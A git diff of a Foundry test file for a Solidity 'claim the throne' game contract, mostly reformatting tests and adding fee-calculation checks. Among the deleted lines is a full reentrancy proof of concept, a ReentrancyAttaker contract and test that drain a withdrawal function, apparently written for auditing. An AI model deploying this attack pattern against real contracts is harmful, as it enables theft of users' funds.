@@ -33,13 +33,23 @@ contract GameTest is Test {
         vm.deal(maliciousActor, 10 ether);
 
         vm.startPrank(deployer);
-        game = new Game(INITIAL_CLAIM_FEE, GRACE_PERIOD, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
+        game = new Game(
+            INITIAL_CLAIM_FEE,
+            GRACE_PERIOD,
+            FEE_INCREASE_PERCENTAGE,
+            PLATFORM_FEE_PERCENTAGE
+        );
         vm.stopPrank();
     }
 
     function testConstructor_RevertInvalidGracePeriod() public {
         vm.expectRevert("Game: Grace period must be greater than zero.");
-        new Game(INITIAL_CLAIM_FEE, 0, FEE_INCREASE_PERCENTAGE, PLATFORM_FEE_PERCENTAGE);
+        new Game(
+            INITIAL_CLAIM_FEE,
+            0,
+            FEE_INCREASE_PERCENTAGE,
+            PLATFORM_FEE_PERCENTAGE
+        );
     }
 
     /*//////////////////////////////////////////////////////////////
@@ -50,7 +60,11 @@ contract GameTest is Test {
         address _currentKing = game.currentKing();
         console2.log("Current King: ", _currentKing);
         // Check that the current king is zero before claiming
-        assertEq(_currentKing, address(0), "Current King should be zero before claiming");
+        assertEq(
+            _currentKing,
+            address(0),
+            "Current King should be zero before claiming"
+        );
         vm.startPrank(player1);
         vm.expectRevert("Game: You are already the king. No need to re-claim.");
         game.claimThrone{value: INITIAL_CLAIM_FEE}();
@@ -58,6 +72,7 @@ contract GameTest is Test {
     }
 
     function _claimThroneByUser(address _player, uint256 _fee) internal {
+        vm.deal(_player, _fee);
         vm.startPrank(_player);
         game.claimThrone{value: _fee}();
         vm.stopPrank();
@@ -67,19 +82,44 @@ contract GameTest is Test {
         _claimThroneByUser(player1, INITIAL_CLAIM_FEE);
 
         uint256 claimTimestamp = block.timestamp;
-        assertEq(address(game).balance, INITIAL_CLAIM_FEE, "Contract should have balance equal to INITIAL_CLAIM_FEE");
-        uint256 expectedPlatformFee = (INITIAL_CLAIM_FEE * PLATFORM_FEE_PERCENTAGE) / 100;
+        assertEq(
+            address(game).balance,
+            INITIAL_CLAIM_FEE,
+            "Contract should have balance equal to INITIAL_CLAIM_FEE"
+        );
+        uint256 expectedPlatformFee = (INITIAL_CLAIM_FEE *
+            PLATFORM_FEE_PERCENTAGE) / 100;
         assertEq(
             game.pot(),
             INITIAL_CLAIM_FEE - expectedPlatformFee,
             "Pot should be equal to INITIAL_CLAIM_FEE - expectedPlatformFee"
         );
         // Check that the player is now the king
-        assertEq(game.currentKing(), player1, "Player 1 should be current king");
-        assertEq(game.lastClaimTime(), claimTimestamp, "Last claim time should match the block timestamp, ");
-        assertEq(game.gameRound(), 1, "Game round should be incremented by 1 after claiming");
-        assertEq(game.totalClaims(), 1, "Total claims should be incremented by 1 after claiming");
-        assertEq(game.gameEnded(), false, "Game should not be ended after claiming");
+        assertEq(
+            game.currentKing(),
+            player1,
+            "Player 1 should be current king"
+        );
+        assertEq(
+            game.lastClaimTime(),
+            claimTimestamp,
+            "Last claim time should match the block timestamp, "
+        );
+        assertEq(
+            game.gameRound(),
+            1,
+            "Game round should be incremented by 1 after claiming"
+        );
+        assertEq(
+            game.totalClaims(),
+            1,
+            "Total claims should be incremented by 1 after claiming"
+        );
+        assertEq(
+            game.gameEnded(),
+            false,
+            "Game should not be ended after claiming"
+        );
     }
 
     // this function will test the game round functionality with a winner
@@ -89,7 +129,9 @@ contract GameTest is Test {
 
         vm.warp(block.timestamp + 1 hours);
 
-        uint256 expectedNewFee = game.claimFee() + (game.claimFee() * FEE_INCREASE_PERCENTAGE) / 100;
+        uint256 expectedNewFee = game.claimFee() +
+            (game.claimFee() * FEE_INCREASE_PERCENTAGE) /
+            100;
         // claim throne as player 2
         _claimThroneByUser(player2, game.claimFee());
         assertEq(game.claimFee(), expectedNewFee);
@@ -98,7 +140,9 @@ contract GameTest is Test {
         vm.expectRevert("Game: Grace period has not expired yet.");
         game.declareWinner();
         // increase time to finish the game
-        vm.warp(block.timestamp + game.getRemainingTime() + game.lastClaimTime());
+        vm.warp(
+            block.timestamp + game.getRemainingTime() + game.lastClaimTime()
+        );
         // declare winner
         game.declareWinner();
 
@@ -109,75 +153,110 @@ contract GameTest is Test {
         game.withdrawWinnings();
         vm.stopPrank();
         assertEq(
-            player2.balance, player2BalanceBeforeWithdraw + pendingWinAmount, "Winner should receive the winnings."
+            player2.balance,
+            player2BalanceBeforeWithdraw + pendingWinAmount,
+            "Winner should receive the winnings."
         );
         assertEq(game.gameEnded(), true);
     }
 
-    // this function demostrate reentrancy attack on withdrawWinnings function in Game contract.
-    function test_reentrancyAttack_withdrawWinnings() public {
-        // deploy reentrancy contract
-        ReentrancyAttaker attackerContract = new ReentrancyAttaker(game);
-        // fill the game contract with some funds,
-        //  to replicate an scenario where the game contract balance is higher than 1 game round pot.
-        // so we can demostrate that an attacker can drain more than the winnings funds.
-        vm.deal(address(game), 1 ether);
-
-        // contract join game round as player by claiming the throne and paying the entrance fee.
-        vm.startPrank(maliciousActor);
-        attackerContract.claimThrone{value: INITIAL_CLAIM_FEE}();
-        vm.stopPrank();
-        assertEq(game.currentKing(), address(attackerContract));
-
-        // warp time until the game round ends.
-        vm.warp(block.timestamp + game.getRemainingTime() + game.lastClaimTime());
-        // declare winner
-        game.declareWinner();
-        // track balances before the attack
-        uint256 startingAttackContractBalance = address(attackerContract).balance;
-        uint256 startingContractBalance = address(game).balance;
-
-        // start the attack by calling withdrawWinnings function in game contract.
-        vm.startPrank(maliciousActor);
-        attackerContract.attack();
-        vm.stopPrank();
-
-        console2.log("starting attacker contract balance: ", startingAttackContractBalance);
-        console2.log("starting contract balance: ", startingContractBalance);
-
-        console2.log("ending attacker contract balance: ", address(attackerContract).balance);
-        console2.log("ending contract balance: ", address(game).balance);
-    }
-}
-
-contract ReentrancyAttaker {
-    Game game;
-    uint256 initialEntranceFee;
-
-    constructor(Game _game) {
-        game = _game;
+    function test_percentages() public {
+        uint256 sentAmount = 100 ether;
+        uint256 platformFeePercentage = 10;
+        uint256 currentPlatformFee = 0;
+        currentPlatformFee = (sentAmount * platformFeePercentage) / 100;
+        console2.log("sentAmount: %s [%e]", sentAmount, sentAmount);
+        console2.log(
+            "platformFeePercentage: %s [%e]",
+            platformFeePercentage,
+            platformFeePercentage
+        );
+        console2.log(
+            "currentPlatformFee: %s [%e]",
+            currentPlatformFee,
+            currentPlatformFee
+        );
     }
 
-    function claimThrone() public payable {
-        initialEntranceFee = msg.value;
-        game.claimThrone{value: msg.value}();
-    }
+    function test_previousKingPayout() public {
+        // uint256 sentAmount = 1.5 ether;
+        // uint256 previousKingPayout = 0;
+        // uint256 platformFeePercentage = 1000;
+        // uint256 currentPlatformFee = 0;
 
-    function attack() external {
-        game.withdrawWinnings();
-    }
+        // // Calculate platform fee
+        // currentPlatformFee = (sentAmount * platformFeePercentage) / 10_000;
 
-    function _reentrancy() internal {
-        if (address(game).balance >= initialEntranceFee) {
-            game.withdrawWinnings();
-        }
-    }
+        // // Defensive check to ensure platformFee doesn't exceed available amount after previousKingPayout
+        // if (currentPlatformFee > (sentAmount - previousKingPayout)) {
+        //     currentPlatformFee = sentAmount - previousKingPayout;
+        // }
+        // console2.log("sentAmount: %s [%e]", sentAmount, sentAmount);
+        // console2.log(
+        //     "platformFeePercentage: %s [%e]",
+        //     platformFeePercentage,
+        //     platformFeePercentage
+        // );
+        // console2.log(
+        //     "previousKingPayout: %s [%e]",
+        //     previousKingPayout,
+        //     previousKingPayout
+        // );
+        // console2.log(
+        //     "condition bool: %s ",
+        //     currentPlatformFee > (sentAmount - previousKingPayout)
+        // );
+        // console2.log(
+        //     "condition calc: %s [%e]",
+        //     sentAmount - previousKingPayout,
+        //     sentAmount - previousKingPayout
+        // );
+        // console2.log(
+        //     "currentPlatformFee: %s [%e]",
+        //     currentPlatformFee,
+        //     currentPlatformFee
+        // );
 
-    fallback() external payable {
-        _reentrancy();
-    }
+        // claim throne as player 1
+        _claimThroneByUser(player1, INITIAL_CLAIM_FEE);
+        assertEq(game.currentKing(), player1);
+        assertEq(game.getPreviousPayout(player1), INITIAL_CLAIM_FEE);
 
-    receive() external payable {
-        _reentrancy();
+        uint256 _cpfp1 = (INITIAL_CLAIM_FEE * game.platformFeePercentage()) /
+            100;
+
+        console2.log(
+            "Player1 %s : %e",
+            game.getPreviousPayout(player1),
+            game.getPreviousPayout(player1)
+        );
+        console2.log("Player1 _cpf %s : %e", _cpfp1, _cpfp1);
+
+        // claim throne as player 2
+        // uint256 _newFee = game.claimFee();
+        // uint256 expectedPlayerTwoPayout = _newFee
+
+        _claimThroneByUser(player2, game.claimFee());
+        uint256 claimFeePlayer2 = game.claimFee();
+        uint256 _cpfp2 = (claimFeePlayer2 * game.platformFeePercentage()) / 100;
+        console2.log("Player2 _cpf %s : %e", _cpfp2, _cpfp2);
+        console2.log(
+            "Player2 claimFee %s : %e",
+            claimFeePlayer2,
+            claimFeePlayer2
+        );
+        uint256 _conditionCalc = claimFeePlayer2 -
+            game.getPreviousPayout(player1);
+        console2.log("Condition  %s : %e", _conditionCalc, _conditionCalc);
+        console2.log(
+            "Condition bool: %s",
+            _cpfp2 > _conditionCalc
+        );
+
+        console2.log(
+            "Player2 %s : %e",
+            game.getPreviousPayout(player2),
+            game.getPreviousPayout(player2)
+        );
     }
 }
